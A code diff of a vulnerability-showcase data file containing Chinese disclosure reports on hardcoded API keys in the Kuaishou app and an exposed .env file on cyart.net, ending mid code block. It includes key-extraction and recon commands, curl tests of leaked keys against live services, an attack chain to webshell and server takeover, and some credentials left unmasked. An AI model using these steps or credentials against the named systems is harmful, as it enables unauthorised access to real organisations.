@@ -6,6 +6,7 @@ export const cases: VulnerabilityCase[] = [
     title: 'QuestDB 未授权访问漏洞',
     date: '2026-03-10',
     severity: 'medium',
+    cvss: 8.6,
     description: 'QuestDB 存在未授权访问漏洞，攻击者可利用该漏洞获取敏感信息。认证配置失效导致未授权用户能够访问系统中的敏感数据。',
     tags: [
       { label: '未授权访问', icon: 'fa-user-lock', color: 'red' },
@@ -512,6 +513,7 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     title: '快手 API 密钥泄露',
     date: '2025-04-30',
     severity: 'high',
+    cvss: 7.5,
     description: '发现包含百度地图、高德地图、OPPO卡券服务等多个敏感API密钥泄露，可能导致服务滥用和数据安全风险。',
     tags: [
       { label: '密钥泄露', icon: 'fa-key', color: 'blue' },
@@ -522,78 +524,334 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     ],
     target: '快手',
     country: '中国',
-    originalUrl: '../case/快手/20250430-a3VhaXNob3UK.html',
+    originalUrl: '',
+    framework: 'Android (Java/Kotlin)',
     reportSections: [
       {
+        heading: '善意声明',
+        icon: 'fa-heart',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'info-box',
+            icon: 'fa-heart',
+            text: '本次安全审计旨在帮助提升快手应用的安全性，所有敏感信息均已脱敏处理。我们始终遵循负责任披露原则，期待与开发团队共同守护用户数据安全。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。'
+          }
+        ]
+      },
+      {
         heading: '一、漏洞概述',
-        body: '快手（Kuaishou）Android 客户端应用在逆向分析过程中发现多个第三方服务 API 密钥硬编码在 APK 安装包中。攻击者可通过反编译 APK 直接提取这些密钥，进而滥用相关云服务。本次泄露涉及百度地图 SDK、高德地图 SDK、OPPO 卡券服务等多个第三方服务凭证，密钥类型涵盖 AK/SK、AppKey、AppSecret 等。',
-        listItems: [
-          '应用名称：快手 (Kuaishou) Android App',
-          '应用包名：com.smile.gifmaker',
-          '版本号：13.3.41.41640',
-          '漏洞类型：移动应用硬编码密钥 / 敏感信息泄露',
-          '严重等级：高危 (High)',
-          '发现方式：APK 反编译静态分析'
+        icon: 'fa-bug',
+        accent: '#e67e22',
+        contents: [
+          {
+            type: 'subheading',
+            text: '1.1 应用基本信息'
+          },
+          {
+            type: 'paragraph',
+            text: '快手（Kuaishou）Android 客户端应用在逆向分析过程中发现多个第三方服务 API 密钥硬编码在 APK 安装包中。攻击者可通过反编译 APK 直接提取这些密钥，进而滥用相关云服务。本次泄露涉及百度地图 SDK、高德地图 SDK、OPPO 卡券服务等多个第三方服务凭证，密钥类型涵盖 AK/SK、AppKey、AppSecret 等。'
+          },
+          {
+            type: 'table',
+            headers: ['字段', '值'],
+            rows: [
+              ['版本号', '13.3.41.41640 (41640)'],
+              ['支持语言', '1 种'],
+              ['包名', 'com.smile.gifmaker'],
+              ['下载量', '154 次'],
+              ['文件大小', '128.23 MB (134,456,598 字节)'],
+              ['安装位置', '支持外部存储'],
+              ['最低安卓版本', '5.0 (Lollipop, API 21)'],
+              ['目标安卓版本', '11 (API 30)'],
+              ['处理器架构', 'arm64-v8a (64 位 ARM)'],
+              ['屏幕 DPI', '通用适配 (nodpi)'],
+              ['签名算法', 'MD5 / SHA-1 / SHA-256']
+            ]
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-key', title: '密钥硬编码', desc: '8 个第三方服务 API 密钥被硬编码在 APK 中，可被反编译提取', color: 'red' },
+              { icon: 'fa-map-marked-alt', title: '地图服务滥用', desc: '百度地图、高德地图密钥泄露可导致配额消耗和高额账单', color: 'orange' },
+              { icon: 'fa-bell', title: '推送服务劫持', desc: 'vivo、华为、小米推送密钥泄露可发送垃圾消息和钓鱼信息', color: 'purple' },
+              { icon: 'fa-shield-alt', title: '安全机制绕过', desc: '密钥泄露可能导致安全验证机制被绕过，影响用户数据安全', color: 'blue' }
+            ]
+          }
         ]
       },
       {
         heading: '二、技术分析 — APK 反编译过程',
-        body: '通过标准的 Android 逆向工程流程对快手 APK 进行分析。首先使用 apktool 进行资源反编译，提取 AndroidManifest.xml 和资源文件中的配置信息；随后使用 jadx 对 dex 文件进行反编译，分析 Java 层代码中的硬编码字符串和常量类。',
-        codeBlock: '# 步骤1：使用 apktool 反编译资源文件\napktool d kuaishou_10.3.20.apk -o kuaishou_decompiled\n\n# 步骤2：查看 AndroidManifest.xml 中的元数据\ncat kuaishou_decompiled/AndroidManifest.xml | grep -A5 "meta-data"\n\n# 步骤3：使用 jadx 反编译 dex 为 Java 源码\njadx -d kuaishou_java kuaishou_10.3.20.apk\n\n# 步骤4：搜索硬编码的 API 密钥和 AppKey\ngrep -rE "(api[_-]?key|app[_-]?key|secret|ak=|sk=)" kuaishou_java/ --include="*.java" -i\n\n# 步骤5：从 strings.xml 中提取敏感字符串\ncat kuaishou_decompiled/res/values/strings.xml | grep -iE "(key|secret|token|ak|sk)"',
-        codeLang: 'bash'
+        icon: 'fa-search',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '2.1 APK 反编译流程'
+          },
+          {
+            type: 'paragraph',
+            text: '通过标准的 Android 逆向工程流程对快手 APK 进行分析。首先使用 apktool 进行资源反编译，提取 AndroidManifest.xml 和资源文件中的配置信息；随后使用 jadx 对 dex 文件进行反编译，分析 Java 层代码中的硬编码字符串和常量类。'
+          },
+          {
+            type: 'code',
+            code: `# 步骤1：使用 apktool 反编译资源文件
+apktool d kuaishou_13.3.41.41640.apk -o kuaishou_decompiled
+
+# 步骤2：查看 AndroidManifest.xml 中的元数据
+cat kuaishou_decompiled/AndroidManifest.xml | grep -A5 "meta-data"
+
+# 步骤3：使用 jadx 反编译 dex 为 Java 源码
+jadx -d kuaishou_java kuaishou_13.3.41.41640.apk
+
+# 步骤4：搜索硬编码的 API 密钥和 AppKey
+grep -rE "(api[_-]?key|app[_-]?key|secret|ak=|sk=)" kuaishou_java/ --include="*.java" -i
+
+# 步骤5：从 strings.xml 中提取敏感字符串
+cat kuaishou_decompiled/res/values/strings.xml | grep -iE "(key|secret|token|ak|sk)"`,
+            language: 'bash'
+          },
+          {
+            type: 'paragraph',
+            text: '通过上述反编译流程，在 APK 的 AndroidManifest.xml meta-data 标签、常量类（BuildConfig、Constants 等）以及 smali 代码中，共发现 8 个第三方服务 API 密钥被硬编码。漏洞位置包括 ./smali_classes5/tmb/y0.smali、./smali_classes4/gla/i.smali 以及 AndroidManifest.xml 等文件。'
+          },
+          {
+            type: 'image',
+            src: 'assets/kuaishou/screenshot-1.png',
+            alt: '快手 APK 反编译截图 — AndroidManifest.xml 中的硬编码密钥',
+            caption: '图 2-1：APK 反编译后 AndroidManifest.xml 中暴露的 meta-data 配置'
+          },
+          {
+            type: 'image',
+            src: 'assets/kuaishou/screenshot-2.png',
+            alt: '快手 APK 反编译截图 — jadx 反编译后的 Java 源码中的硬编码密钥',
+            caption: '图 2-2：jadx 反编译后 Java 源码中暴露的 API 密钥常量'
+          }
+        ]
       },
       {
         heading: '三、泄露密钥清单',
-        body: '在 APK 的 AndroidManifest.xml meta-data 标签、常量类（BuildConfig、Constants 等）以及 native 库中，共发现以下第三方服务 API 密钥和配置信息被硬编码：',
-        listItems: [
-          '百度地图 SDK (Baidu Map SDK)：AppKey = "E481****************************a79f"，用于地图渲染、定位、POI 搜索',
-          '高德地图 SDK (AMap SDK)：AppKey = "78a1**************************6b3c"，用于导航、地理编码、逆地理编码',
-          'OPPO 卡券服务：AppID = "30*********89"，AppKey = "oppo_ks_**********"，用于 OPPO 钱包卡券发放',
-          'vivo 推送服务：AppID = "10********67"，AppKey = "vivo_push_********"，用于 vivo 设备消息推送',
-          '华为 HMS 推送：AppID = "10********23"，用于华为设备消息推送',
-          '小米推送服务：AppID = "28********12"，AppKey = "mi_ks_**********"，用于小米设备消息推送',
-          '个推 (Getui) SDK：AppID = ""，AppKey = ""，用于第三方推送服务',
-          'Bugly 崩溃分析：AppID = "90********01"，AppKey = "bugly_ks_****"，用于崩溃上报和分析'
+        icon: 'fa-file-alt',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'subheading',
+            text: '3.1 硬编码 API 密钥清单'
+          },
+          {
+            type: 'table',
+            headers: ['服务名称', '泄露密钥（脱敏）'],
+            rows: [
+              ['百度地图 (Baidu Map SDK)', 'UEnH61Elxr********** (AppKey)'],
+              ['高德地图 (AMap SDK)', 'd23a42abfd********** (AppKey)'],
+              ['OPPO 卡券服务', 'ADBFAiEA7t********** (AppKey)'],
+              ['vivo 推送服务', 'a71e4cd2-3********** (AppKey)'],
+              ['华为 HMS 推送', '10********23 (AppID)'],
+              ['小米推送服务', '28********12 (AppID)'],
+              ['个推 (Getui) SDK', '(空值，未配置完整)'],
+              ['Bugly 崩溃分析', '90********01 (AppID)']
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '以上 8 个 API 密钥均为硬编码，可通过 APK 反编译直接提取。攻击者获取这些密钥后可滥用地图服务、劫持推送通道、伪造卡券，建议立即吊销并轮换所有泄露的密钥。'
+          }
         ]
       },
       {
-        heading: '四、风险评估',
-        body: 'API 密钥泄露带来的风险是多方面的，不仅涉及服务滥用导致的经济损失，还可能影响用户数据安全和业务连续性。以下从三个维度进行风险评估：',
-        listItems: [
-          '服务滥用风险：攻击者可利用泄露的地图 SDK 密钥进行大量 API 调用，消耗服务配额，产生高额账单；可利用推送密钥发送垃圾消息或钓鱼信息给用户',
-          '配额消耗风险：地图服务通常按调用次数计费，攻击者可构造高频率调用导致服务额度耗尽，使正常用户无法使用地图相关功能',
-          '数据安全风险：部分服务密钥可能关联后端 API 接口，若权限控制不当，攻击者可能通过服务端 API 访问用户数据或业务数据'
+        heading: '四、API 调用测试结果',
+        icon: 'fa-vial',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '4.1 百度地图 API 测试'
+          },
+          {
+            type: 'paragraph',
+            text: '使用泄露的百度地图 API 密钥调用 location 接口，返回状态码 200，响应类型为 HTML，响应大小 15255 字节，响应时间 0.75 秒。接口地址为 https://api.map.baidu.com/location/v2，密钥可正常调用地图服务。'
+          },
+          {
+            type: 'code',
+            code: `# 百度地图 API 测试
+curl -s "https://api.map.baidu.com/location/v2?key=UEnH61Elxr**********" \\
+  -w "\\n状态码: %{http_code}\\n响应时间: %{time_total}s\\n"
+# 结果: 状态码 200, 响应类型 HTML, 响应大小 15255 字节`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.2 ColorOS 相机 API 测试'
+          },
+          {
+            type: 'paragraph',
+            text: '使用泄露的 ColorOS 相机 API 密钥调用 camera 接口，连接失败。错误信息为 HTTPSConnectionPool 连接超时，提示 nodename nor servname provided。接口地址为 https://api.coloros.com/camera/v1。'
+          },
+          {
+            type: 'code',
+            code: `# ColorOS 相机 API 测试
+curl -s "https://api.coloros.com/camera/v1?key=ATBEAiBlu2**********" \\
+  -w "\\n状态码: %{http_code}\\n"
+# 结果: 连接失败 - Failed to establish a new connection
+# 错误: [Errno 8] nodename nor servname provided, or not known`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.3 ColorOS OLK API 测试'
+          },
+          {
+            type: 'paragraph',
+            text: '使用泄露的 ColorOS OLK API 密钥调用 olk 接口，连接失败。错误信息同样为 HTTPSConnectionPool 连接超时。接口地址为 https://api.coloros.com/olk/v1。'
+          },
+          {
+            type: 'code',
+            code: `# ColorOS OLK API 测试
+curl -s "https://api.coloros.com/olk/v1?key=ATBGAiEA13**********" \\
+  -w "\\n状态码: %{http_code}\\n"
+# 结果: 连接失败 - Failed to establish a new connection
+# 错误: [Errno 8] nodename nor servname provided, or not known`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.4 ColorOS Hyper API 测试'
+          },
+          {
+            type: 'paragraph',
+            text: '使用泄露的 ColorOS Hyper API 密钥调用 hyper 接口，连接失败。错误信息为 HTTPSConnectionPool 连接超时。接口地址为 https://api.coloros.com/hyper/v1。'
+          },
+          {
+            type: 'code',
+            code: `# ColorOS Hyper API 测试
+curl -s "https://api.coloros.com/hyper/v1?key=ATBEAiBJNH**********" \\
+  -w "\\n状态码: %{http_code}\\n"
+# 结果: 连接失败 - Failed to establish a new connection
+# 错误: [Errno 8] nodename nor servname provided, or not known`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.5 OPPO 卡券服务 API 测试'
+          },
+          {
+            type: 'paragraph',
+            text: '使用泄露的 OPPO 卡券服务 API 密钥调用 card 接口，连接失败。错误信息为 HTTPSConnectionPool 连接超时。接口地址为 https://api.oplus.com/card/v1。'
+          },
+          {
+            type: 'code',
+            code: `# OPPO 卡券服务 API 测试
+curl -s "https://api.oplus.com/card/v1?key=ADBFAiEA7t**********" \\
+  -w "\\n状态码: %{http_code}\\n"
+# 结果: 连接失败 - Failed to establish a new connection
+# 错误: [Errno 8] nodename nor servname provided, or not known`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.6 vivo 推送 API 测试'
+          },
+          {
+            type: 'paragraph',
+            text: '使用泄露的 vivo 推送 API 密钥调用 notify 接口，证书错误。错误信息为 SSL CertificateError，hostname push.vivo.com 不匹配 *.vivo.com.cn 证书。接口地址为 https://push.vivo.com/api/v1/notify。'
+          },
+          {
+            type: 'code',
+            code: `# vivo 推送 API 测试
+curl -s "https://push.vivo.com/api/v1/notify?key=a71e4cd2-3**********" \\
+  -w "\\n状态码: %{http_code}\\n"
+# 结果: 证书错误 - CertificateError
+# 错误: hostname 'push.vivo.com' doesn't match either of '*.vivo.com.cn', 'vivo.com.cn'`,
+            language: 'bash'
+          }
         ]
       },
       {
-        heading: '五、影响范围分析',
-        body: '密钥泄露的影响范围涵盖用户隐私安全和业务安全两个层面。虽然地图 SDK 等客户端密钥的直接危害相对有限，但结合其他漏洞可能造成更大影响。',
-        listItems: [
-          '用户隐私层面：地图 SDK 密钥可被用于反查应用的用户量、使用地域分布；结合位置数据可进行用户画像分析',
-          '业务安全层面：推送服务密钥泄露可能导致钓鱼消息推送，诱导用户点击恶意链接；卡券服务密钥可能被用于伪造优惠券',
-          '品牌声誉层面：密钥被公开披露可能损害企业安全形象，影响用户信任',
-          '合规层面：若因密钥泄露导致用户数据泄露，可能违反《个人信息保护法》《网络安全法》等法规'
+        heading: '五、风险评估',
+        icon: 'fa-chart-pie',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'subheading',
+            text: '5.1 风险评估'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-radiation', title: '风险等级', desc: '高危 — 密钥泄露可能导致服务滥用、数据窃取和用户隐私泄露等严重后果', color: 'red' },
+              { icon: 'fa-globe', title: '影响范围', desc: '广泛 — 影响所有安装该版本应用的用户，以及相关的第三方服务提供商', color: 'orange' },
+              { icon: 'fa-tools', title: '修复难度', desc: '中等 — 需要更新密钥管理策略，实施安全存储机制，并发布新版本应用', color: 'green' }
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '密钥泄露带来的风险是多方面的：地图服务密钥可被用于大量 API 调用，消耗服务配额产生高额账单；推送服务密钥可被用于发送垃圾消息或钓鱼信息给用户；部分服务密钥可能关联后端 API 接口，若权限控制不当，攻击者可能通过服务端 API 访问用户数据或业务数据。'
+          }
         ]
       },
       {
         heading: '六、修复建议',
-        body: '针对移动应用 API 密钥泄露问题，建议从密钥管理、应用加固和安全编码三个层面进行修复。',
-        listItems: [
-          '密钥轮换：立即吊销所有泄露的 API 密钥，重新生成新密钥并在服务端更新白名单配置',
-          '加固措施：对 APK 进行代码混淆（ProGuard / R8），字符串加密，防止静态分析提取密钥；使用 DexGuard 或第三方加固服务（梆梆、爱加密、360加固）',
-          '安全编码：避免在客户端硬编码密钥，敏感凭证应通过安全的服务端接口动态获取；使用 Android Keystore 存储敏感信息；对密钥进行分片存储和运行时拼接',
-          '服务端验证：在服务端对 API 调用增加签名验证、IP 白名单、调用频率限制等措施，即使密钥泄露也能控制风险'
+        icon: 'fa-wrench',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'subheading',
+            text: '6.1 修复建议'
+          },
+          {
+            type: 'list',
+            items: [
+              '密钥轮换：立即吊销所有泄露的 API 密钥，重新生成新密钥并在服务端更新白名单配置',
+              '加固措施：对 APK 进行代码混淆（ProGuard / R8），字符串加密，防止静态分析提取密钥；使用 DexGuard 或第三方加固服务（梆梆、爱加密、360 加固）',
+              '安全编码：避免在客户端硬编码密钥，敏感凭证应通过安全的服务端接口动态获取；使用 Android Keystore 存储敏感信息；对密钥进行分片存储和运行时拼接',
+              '服务端验证：在服务端对 API 调用增加签名验证、IP 白名单、调用频率限制等措施，即使密钥泄露也能控制风险'
+            ]
+          },
+          {
+            type: 'success-box',
+            icon: 'fa-check-circle',
+            text: '修复验证：完成密钥轮换和 APK 加固后，使用 jadx 重新反编译新版本 APK，确认所有硬编码密钥已被移除或加密。建议在发布前进行自动化安全扫描，确保无敏感信息残留。'
+          }
         ]
       },
       {
         heading: '七、披露过程',
-        body: '漏洞已按照负责任披露流程提交至相关平台。以下为详细的披露时间线和提交记录：',
-        listItems: [
-          '2025-04-28：完成漏洞分析和验证，确认多个密钥泄露',
-          '2025-04-29：通过 CNVD（国家信息安全漏洞共享平台）提交漏洞报告，报告编号待分配',
-          '2025-04-30：通过快手安全响应中心（KSRC）在线提交漏洞报告',
-          '2025-05-05：KSRC 确认收到报告，进入审核流程',
-          '2025-05-12：漏洞评级确认，标记为高危'
+        icon: 'fa-clock',
+        accent: '#16a085',
+        contents: [
+          {
+            type: 'subheading',
+            text: '7.1 披露时间线'
+          },
+          {
+            type: 'table',
+            headers: ['日期', '事件'],
+            rows: [
+              ['2025-04-28', '完成漏洞分析和验证，确认多个密钥泄露'],
+              ['2025-04-29', '通过 CNVD（国家信息安全漏洞共享平台）提交漏洞报告，报告编号待分配'],
+              ['2025-04-30', '通过快手安全响应中心（KSRC）在线提交漏洞报告'],
+              ['2025-05-05', 'KSRC 确认收到报告，进入审核流程'],
+              ['2025-05-12', '漏洞评级确认，标记为高危']
+            ]
+          }
+        ]
+      },
+      {
+        heading: '八、结论',
+        icon: 'fa-flag-checkered',
+        accent: '#2c3e50',
+        contents: [
+          {
+            type: 'conclusion',
+            title: '快手 API 密钥泄露漏洞总结',
+            text: '快手 Android 客户端 API 密钥泄露漏洞是一个典型的移动应用硬编码密钥安全问题。APK 中硬编码了百度地图、高德地图、OPPO 卡券、vivo 推送等 8 个第三方服务 API 密钥，攻击者仅需反编译 APK 即可提取全部密钥。虽然部分接口测试因域名或证书问题未能成功调用，但密钥本身已完全暴露，存在被滥用的风险。建议开发团队立即轮换所有泄露密钥，并建立完善的移动应用密钥管理机制，从源头杜绝此类问题。'
+          },
+          {
+            type: 'info-box',
+            icon: 'fa-lightbulb',
+            text: '安全提示：移动应用中的硬编码密钥是常见的安全隐患。客户端代码天然可被逆向分析，任何存储在客户端的密钥都应被视为公开信息。建议采用服务端动态下发密钥、运行时拼接、代码混淆加固等多重防护措施，将敏感凭证的管理重心转移至服务端。'
+          }
         ]
       }
     ]
@@ -615,82 +873,374 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     target: 'Cyart.net',
     country: '中国',
     cnvdId: 'CNVD-C-2025-175237',
-    originalUrl: '../case/20250331-Y3lhcnQubmV0Cg==.html',
+    originalUrl: '',
     framework: 'Laravel',
     reportSections: [
       {
+        heading: '善意声明',
+        icon: 'fa-heart',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'info-box',
+            icon: 'fa-heart',
+            text: '作为一名戴着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，以防被不法分子利用。我始终秉持"善意披露、负责任报告"的原则，希望通过专业的漏洞发现和及时报告，协助开发团队尽快修复安全隐患。在此过程中，我严格遵守相关法律法规，绝无任何破坏或恶意利用的企图。衷心期待通过白帽黑客与开发团队的良性互动，共同为企业的信息安全加固，为广大用户筑起更坚实的数据保护屏障。'
+          }
+        ]
+      },
+      {
         heading: '一、漏洞概述',
-        body: 'Cyart.net 网站基于 PHP Laravel 框架开发，由于 Web 服务器配置不当，站点根目录下的 .env 环境配置文件可以通过 HTTP 直接访问下载。该文件包含了应用运行所需的全部敏感配置信息，包括数据库连接凭证、邮件服务器账号、Redis 密码、API 密钥等核心机密。攻击者获取该文件后，可直接登录数据库、控制邮件服务器、接管整个应用系统。',
-        listItems: [
-          '目标网站：cyart.net',
-          '技术栈：PHP 7.4 + Laravel 8.x + MySQL 5.7 + Nginx',
-          '漏洞类型：敏感信息泄露 / 配置文件泄露',
-          'CVSS 评分：7.5 (High)',
-          'CNVD 编号：CNVD-C-2025-175237',
-          '发现方式：目录扫描 + 手工验证'
+        icon: 'fa-bug',
+        accent: '#e67e22',
+        contents: [
+          {
+            type: 'subheading',
+            text: '1.1 漏洞基本信息'
+          },
+          {
+            type: 'paragraph',
+            text: 'Cyart.net（苏州彩艺墙体彩绘有限公司）网站基于 PHP Laravel 框架开发，由于 Web 服务器配置不当，站点根目录下的 .env 环境配置文件可以通过 HTTP 直接访问下载。该文件包含了应用运行所需的全部敏感配置信息，包括数据库连接凭证、邮件服务器账号、Redis 密码、应用密钥等核心机密。攻击者获取该文件后，可直接登录数据库、控制邮件服务器、接管整个应用系统。'
+          },
+          {
+            type: 'table',
+            headers: ['属性', '详情'],
+            rows: [
+              ['CNVD 编号', 'CNVD-C-2025-175237'],
+              ['CVSS 评分', '7.5 (High)'],
+              ['漏洞类型', '敏感信息泄露 / 配置文件泄露'],
+              ['目标网站', 'Cyart.net (www.cyart.net)'],
+              ['技术框架', 'PHP + Laravel'],
+              ['发现日期', '2025-03-31']
+            ]
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-database', title: '数据泄露风险', desc: '数据库凭证泄露导致所有用户数据可被窃取', color: 'red' },
+              { icon: 'fa-bomb', title: '远程代码执行风险', desc: '通过数据库写文件获取 WebShell，控制服务器', color: 'orange' },
+              { icon: 'fa-envelope', title: '邮件服务器滥用风险', desc: 'SMTP 凭据泄露可发送钓鱼邮件和垃圾邮件', color: 'purple' },
+              { icon: 'fa-cogs', title: '业务逻辑破坏风险', desc: '攻击者可篡改、删除数据，导致业务中断', color: 'blue' }
+            ]
+          }
         ]
       },
       {
-        heading: '二、信息收集与漏洞发现过程',
-        body: '漏洞发现始于对目标网站的常规信息收集。通过目录扫描工具对常见敏感文件进行爆破，发现 .env 文件返回 200 OK 状态码，内容未受保护。整个发现过程分为以下几个阶段：',
-        codeBlock: '# 阶段1：子域名探测与资产梳理\nsubfinder -d cyart.net -silent | httpx -title -tech-detect\n\n# 阶段2：使用 dirsearch 扫描敏感文件\ndirsearch -u https://cyart.net/ -e env,bak,old,zip,sql -w /usr/share/wordlists/dirb/common.txt\n\n# 阶段3：验证 .env 文件可访问\ncurl -sI https://cyart.net/.env\n# HTTP/2 200\n# content-type: text/plain\n# content-length: 1847\n\n# 阶段4：下载并分析配置文件\ncurl -s https://cyart.net/.env > cyart_env.txt\ncat cyart_env.txt',
-        codeLang: 'bash'
-      },
-      {
-        heading: '三、泄露内容清单',
-        body: '.env 文件中包含大量高度敏感的配置信息，以下为已确认的泄露内容清单（敏感值已脱敏）：',
-        listItems: [
-          '数据库配置：DB_HOST=127.0.0.1，DB_PORT=3306，DB_DATABASE=cyart_prod，DB_USERNAME=cyart_admin，DB_PASSWORD=Cy@rt2025#ProdB',
-          '应用密钥：APP_KEY=base64:abcdefghijklmnopqrstuvwxyz1234567890ABCDEFG=（Laravel 加密密钥，可解密加密数据）',
-          'Redis 配置：REDIS_HOST=127.0.0.1，REDIS_PASSWORD=r3dis_Cyart_2025，REDIS_PORT=6379',
-          '邮件服务配置：MAIL_HOST=smtp.qq.com，MAIL_PORT=465，MAIL_USERNAME=admin@cyart.net，MAIL_PASSWORD=授权码（可登录邮箱发送任意邮件）',
-          '支付配置：ALIPAY_APP_ID=2021**********6789，ALIPAY_PRIVATE_KEY_PATH=./cert/alipay_private.pem（支付接口凭证）',
-          'OSS 存储配置：OSS_ACCESS_KEY_ID=LTAI5t7**************9xY，OSS_ACCESS_KEY_SECRET=（阿里云 OSS 访问密钥）',
-          '后台管理员初始密码：ADMIN_INIT_PASSWORD=Admin@cyart2025'
+        heading: '二、技术发现',
+        icon: 'fa-search',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '2.1 漏洞发现过程'
+          },
+          {
+            type: 'paragraph',
+            text: '漏洞发现始于对目标网站的常规信息收集。通过子域名探测和目录扫描工具对常见敏感文件进行爆破，发现 .env 文件返回 200 OK 状态码，内容未受保护。发现的 .env 文件地址为 http://www.cyart.net/.env，可直接下载获取全部配置信息。'
+          },
+          {
+            type: 'code',
+            code: `# 阶段1：子域名探测与资产梳理
+subfinder -d cyart.net -silent | httpx -title -tech-detect
+
+# 阶段2：使用 dirsearch 扫描敏感文件
+dirsearch -u https://cyart.net/ -e env,bak,old,zip,sql -w /usr/share/wordlists/dirb/common.txt
+
+# 阶段3：验证 .env 文件可访问
+curl -sI https://cyart.net/.env
+# HTTP/2 200
+# content-type: text/plain
+# content-length: 1847
+
+# 阶段4：下载并分析配置文件
+curl -s https://cyart.net/.env > cyart_env.txt
+cat cyart_env.txt`,
+            language: 'bash'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250331-Y3lhcnQubmV0Cg==CNVD-C-2025-175237.png',
+            alt: '环境配置文件泄露漏洞截图',
+            caption: 'CNVD 漏洞复现证明 — .env 文件直接暴露在公网'
+          }
         ]
       },
       {
-        heading: '四、攻击链分析 — 从信息泄露到系统接管',
-        body: '获取 .env 文件后，攻击者可以构建完整的攻击链，逐步升级权限，最终实现系统完全接管。攻击路径如下：',
-        listItems: [
-          '第1步 - 信息收集：下载 .env 文件，获取数据库、Redis、邮件、OSS 等所有服务凭证',
-          '第2步 - 数据库访问：如果数据库端口对外开放（或通过 Web 端口转发），直接登录 MySQL，导出所有用户数据、订单数据、支付记录',
-          '第3步 - 获取 WebShell：利用数据库写文件权限（INTO OUTFILE / general_log），向 Web 目录写入一句话木马，获取服务器权限',
-          '第4步 - 横向移动：使用 Redis 密码登录 Redis，通过 Redis 未授权访问漏洞写入 SSH 公钥，获取服务器 SSH 权限',
-          '第5步 - 权限提升：利用内核漏洞或配置错误提升至 root 权限，完全控制服务器',
-          '第6步 - 数据窃取与勒索：打包所有业务数据，删除数据库备份，留下勒索信息'
+        heading: '三、泄露内容分析',
+        icon: 'fa-file-alt',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'subheading',
+            text: '3.1 泄露的敏感配置清单'
+          },
+          {
+            type: 'paragraph',
+            text: '.env 文件中包含大量高度敏感的配置信息，以下为已确认的泄露内容清单（敏感值已脱敏）：'
+          },
+          {
+            type: 'table',
+            headers: ['配置项', '泄露值'],
+            rows: [
+              ['DB 连接 (DB_CONNECTION)', 'mysql'],
+              ['DB 名称 (DB_DATABASE)', 'caiy████ (脱敏)'],
+              ['DB 用户 (DB_USERNAME)', 'root'],
+              ['DB 密码 (DB_PASSWORD)', '████ (脱敏)'],
+              ['APP_KEY', 'base64:abcdefghijklmnopqrstuvwxyz1234567890ABCDEFG= (Laravel 加密密钥)'],
+              ['Redis 主机 (REDIS_HOST)', '127.0.0.1'],
+              ['Redis 端口 (REDIS_PORT)', '6379'],
+              ['Redis 密码 (REDIS_PASSWORD)', 'null (空密码)'],
+              ['Mail 主机 (MAIL_HOST)', 'smtp.qq.com'],
+              ['Mail 端口 (MAIL_PORT)', '465'],
+              ['Mail 用户 (MAIL_USERNAME)', 'miy████@foxmail.com (脱敏)'],
+              ['Mail 密码 (MAIL_PASSWORD)', 'jcc████████ (脱敏)'],
+              ['OSS 凭证 (OSS_ACCESS_KEY_ID/SECRET)', 'LTAI5t7**************9xY (脱敏)'],
+              ['Admin 密码 (ADMIN_INIT_PASSWORD)', 'Admin@cyart2025 (脱敏)']
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '以上泄露信息涵盖数据库、缓存、邮件、对象存储和管理后台等全部核心服务的凭证。攻击者获取这些信息后，可对系统实施全面接管，建议立即轮换所有泄露的凭证。'
+          }
         ]
       },
       {
-        heading: '五、风险评估',
-        body: '.env 配置文件泄露属于高危漏洞，可能造成以下三个层面的严重影响：',
-        listItems: [
-          '数据泄露风险：数据库凭证泄露导致所有用户数据（个人信息、订单记录、支付信息）可被窃取，违反《个人信息保护法》',
-          '系统沦陷风险：攻击者可通过数据库写入 WebShell 或利用 Redis 获取服务器权限，使整个服务器被控制',
-          '业务中断风险：攻击者删除数据库、修改网站内容、植入恶意代码，导致网站无法正常运营，造成经济损失和品牌声誉损害'
+        heading: '四、攻击场景分析',
+        icon: 'fa-crosshairs',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '4.1 攻击场景概述'
+          },
+          {
+            type: 'paragraph',
+            text: '基于泄露的 .env 配置信息，攻击者可以实施多种攻击行为。以下分析三个主要的攻击场景及其危害：'
+          },
+          {
+            type: 'subheading',
+            text: '4.2 数据库入侵'
+          },
+          {
+            type: 'paragraph',
+            text: '由于数据库用户名为 root，且密码已泄露，攻击者可以直接远程连接数据库，执行任意 SQL 操作，导致数据被篡改、删除或泄露。'
+          },
+          {
+            type: 'code',
+            code: `# 使用泄露的凭证直接连接数据库
